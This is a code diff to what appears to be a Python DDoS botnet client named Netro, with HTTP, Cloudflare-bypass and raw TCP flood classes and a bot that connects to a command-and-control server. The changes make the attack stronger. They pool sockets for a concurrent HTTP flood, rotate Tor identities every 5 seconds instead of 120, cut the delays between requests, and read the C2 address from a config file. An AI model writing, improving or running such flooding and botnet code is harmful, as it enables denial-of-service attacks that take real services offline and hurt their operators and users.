@@ -18,6 +18,7 @@ with open("./useragents.txt", "r") as file:
 class NetroHTTP(object):
     kill = False
     active_threads = 0
+    sock_list = []
 
     def __init__(self, url: str, timeout: float, tor_proxies: bool = False):
         self.url = url
@@ -49,6 +50,61 @@ class NetroHTTP(object):
         if self.tor_proxies:
             if sys.platform in ["linux", "linux2"]:
                 threading.Thread(target=self.tor_renewer, daemon=True).start()
+        
+        threading.Thread(target=self.sock_manager, daemon=True).start()
+    
+    def sock_manager(self):
+        parsed_url = urlparse(self.url)
+
+        while time.time() < self.timeout and not self.kill:
+            sock_list = self.sock_list.copy()
+
+            for sock in sock_list:
+                try:
+
+                    path = "/" if not parsed_url.path else parsed_url.path
+
+                    path_request = f"{path}{f'?{parsed_url.query}' if parsed_url.query else ''}{f'#{parsed_url.fragment}' if parsed_url.fragment else ''}"
+
+                    headers = {
+                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                        "Accept-Encoding": "gzip, deflate, br, zstd",
+                        "Accept-Language": "en-US,en;q=0.9",
+                        "Cache-Control": "max-age=0",
+                        "Connection": "Keep-Alive",
+                        "Dnt": "1",
+                        "Host": f"{parsed_url.hostname}{f':{self.port}' if not self.port in [80, 443] else ''}",
+                        "Sec-Ch-Ua": '"Microsoft Edge";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
+                        "Sec-Ch-Ua-Mobile": "?0",
+                        "Sec-Ch-Ua-Platform": '"Windows"',
+                        "Sec-Fetch-Dest": "document",
+                        "Sec-Fetch-Mode": "navigate",
+                        "Sec-Fetch-Site": "none",
+                        "Sec-Fetch-User": "?1",
+                        "Upgrade-Insecure-Requests": "1",
+                        "User-Agent": random.choice(USERAGENTS)
+                    }
+                    request_data = f"GET {path_request} HTTP/1.1\r\n"
+
+                    for header_name in headers:
+                        header_value = headers[header_name]
+                        request_data += f"{header_name}: {header_value}\r\n"
+                    
+                    request_data += "\r\n"
+
+                    sock.send(request_data.encode())
+
+                except Exception as e:
+                    self.sock_list.remove(sock)
+                    continue
+
+            time.sleep(0.1)
+        
+        sock_list = self.sock_list
+
+        for sock in sock_list:
+            sock.close()
+            self.sock_list.remove(sock)
 
     def tor_renewer(self):
         while True:
@@ -56,7 +112,7 @@ class NetroHTTP(object):
                 break
 
             os.system("service tor reload")
-            time.sleep(120)
+            time.sleep(5)
     
     def randstr(self, length: int):
         return "".join(random.choices(string.ascii_letters + string.digits, k=length))
@@ -77,40 +133,8 @@ class NetroHTTP(object):
             if parsed_url.scheme == "https":
                 ctx = ssl._create_unverified_context()
                 sock = ctx.wrap_socket(sock=sock, server_hostname=parsed_url.hostname)
-            
-            path = "/" if not parsed_url.path else parsed_url.path
 
-            while time.time() < self.timeout and not self.kill:
-                path_request = f"{path}{f'?{parsed_url.query}' if parsed_url.query else ''}{f'#{parsed_url.fragment}' if parsed_url.fragment else ''}"
-
-                headers = {
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-                    "Accept-Encoding": "gzip, deflate, br, zstd",
-                    "Accept-Language": "en-US,en;q=0.9",
-                    "Cache-Control": "max-age=0",
-                    "Connection": "Keep-Alive",
-                    "Dnt": "1",
-                    "Host": f"{parsed_url.hostname}{f':{self.port}' if not self.port in [80, 443] else ''}",
-                    "Sec-Ch-Ua": '"Microsoft Edge";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
-                    "Sec-Ch-Ua-Mobile": "?0",
-                    "Sec-Ch-Ua-Platform": '"Windows"',
-                    "Sec-Fetch-Dest": "document",
-                    "Sec-Fetch-Mode": "navigate",
-                    "Sec-Fetch-Site": "none",
-                    "Sec-Fetch-User": "?1",
-                    "Upgrade-Insecure-Requests": "1",
-                    "User-Agent": random.choice(USERAGENTS)
-                }
-                request_data = f"GET {path_request} HTTP/1.1\r\n"
-
-                for header_name in headers:
-                    header_value = headers[header_name]
-                    request_data += f"{header_name}: {header_value}\r\n"
-                
-                request_data += "\r\n"
-
-                sock.send(request_data.encode())
-                time.sleep(1)
+            self.sock_list.append(sock)
 
         except Exception:
             return
@@ -237,7 +261,7 @@ class NetroHCF(object):
 
         try:
             x = self.scraper.get(self.target, proxies={"http": "socks5://127.0.0.1:9050", "https": "socks5://127.0.0.1:9050"} if self.tor_proxies else None)
-            time.sleep(1)
+            time.sleep(0.1)
         except Exception:
             return
         
@@ -279,7 +303,7 @@ class NetroTCP(object):
             sock.connect((self.host_ip, self.port))
 
             while time.time() < self.timeout and not self.kill:
-                sock.send(random._urandom(16))
+                sent_data = sock.send(random._urandom(16))
 
         except Exception:
             return
@@ -517,7 +541,9 @@ class NetroBot(object):
         return sock.send(json.dumps(message).encode() + b"\r\n\r\n")
 
 def main():
-    netro_bot = NetroBot(host="127.0.0.1", port=4444)
+    config = json.load(open("cnc_config.json", "r"))
+
+    netro_bot = NetroBot(host=config["IP"], port=config["PORT"])
     threading.Thread(target=netro_bot.start, daemon=True).start()
 
     print(f"Netro bot initialized.")
